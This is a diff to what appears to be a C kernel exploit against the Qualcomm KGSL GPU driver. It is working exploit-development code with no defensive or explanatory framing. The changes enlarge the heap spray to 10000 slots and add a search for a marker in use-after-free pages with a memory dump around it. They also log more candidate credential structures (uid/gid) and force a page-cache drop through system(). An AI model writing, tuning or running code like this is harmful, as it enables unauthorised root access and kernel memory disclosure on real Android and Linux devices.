@@ -128,7 +128,7 @@ uint8_t sig_num[] = {1, 3, 5, 7, 9};
 #define FINDING 10
 #define SPRAY_COUNT 3000
 #define SPRAY_COUNT_STEP 500
-#define SPRAY_COUNT_MAX 3000
+#define SPRAY_COUNT_MAX 10000
 #define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
 #define KGSL_USER_MEM_TYPE_ADDR 0x00000002U
 
@@ -1650,6 +1650,7 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
     int kptrs = 0;
     int strings = 0;
     int first_kptr_off = -1;
+    int marker_off = -1;
     char found_str[16] = {0};
     
     for (int i = 0; i < 512; i++) {
@@ -1661,6 +1662,9 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
     }
     
     for (int i = 0; i < 4096 - 8; i++) {
+        if (memcmp(data + i, MARKER_NAME, 8) == 0) {
+            marker_off = i;
+        }
         if (data[i] >= 0x20 && data[i] <= 0x7e) {
             int len = 0;
             while (i + len < 4096 && data[i+len] >= 0x20 && data[i+len] <= 0x7e && len < 15) len++;
@@ -1675,18 +1679,21 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
         }
     }
     
-    if (kptrs > 5 || strings > 0) {
-        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | Sample:\"%s\"", 
-                (unsigned long)va, kptrs, strings, found_str);
+    if (kptrs > 5 || strings > 0 || marker_off != -1) {
+        fprintf(stderr, "\n[DATA] VA:0x%lx | K-PTRs:%d | STRs:%d | MarkerOff:0x%x | Sample:\"%s\"", 
+                (unsigned long)va, kptrs, strings, marker_off, found_str);
         
-        // Detailed dump for any page with more than 5 kernel pointers
-        fprintf(stderr, "\n      DUMP 0x00: ");
-        for (int i = 0; i < 64; i += 8) {
-            fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
-        }
-        if (kptrs > 20) {
-            fprintf(stderr, "\n      DUMP 0x40: ");
-            for (int i = 64; i < 128; i += 8) {
+        if (marker_off != -1) {
+            fprintf(stderr, "\n      DUMP around Marker (0x%x): ", marker_off);
+            int start = (marker_off & ~0xf) - 32;
+            if (start < 0) start = 0;
+            for (int i = 0; i < 128 && start + i < 4096; i += 8) {
+                if (i % 32 == 0) fprintf(stderr, "\n        0x%03x: ", start + i);
+                fprintf(stderr, "%016lx ", *(uint64_t*)(data + start + i));
+            }
+        } else {
+            fprintf(stderr, "\n      DUMP 0x00: ");
+            for (int i = 0; i < 64; i += 8) {
                 fprintf(stderr, "%016lx ", *(uint64_t*)(data + i));
             }
         }
@@ -1924,7 +1931,7 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                                         uint32_t uid = *(uint32_t *)(cc + 4);
                                         uint32_t gid = *(uint32_t *)(cc + 8);
                                         
-                                        if (p_cand < 10) { // Limit parent log to first 10 candidates to avoid flooding
+                                        if (p_cand < 100) { // More verbose parent search
                                             fprintf(stderr, "      [P] Candidate off 0x%x: ptr=0x%lx, uid=%u, usage=%u\n", 
                                                     off, (unsigned long)p, uid, usage);
                                         }
@@ -2424,7 +2431,7 @@ int main(int argc, char **argv)
     }
 
     spray_ctrl = mmap(NULL,
-                      sizeof(spray_slot_t) * SPRAY_COUNT,
+                      sizeof(spray_slot_t) * SPRAY_COUNT_MAX,
                       PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS,
                       -1, 0);
@@ -2433,7 +2440,7 @@ int main(int argc, char **argv)
         perror("mmap spray_ctrl");
         exit(1);
     }
-    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT);
+    memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
 // Принудительная очистка памяти перед запуском
 system("sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null");
 sleep(1);
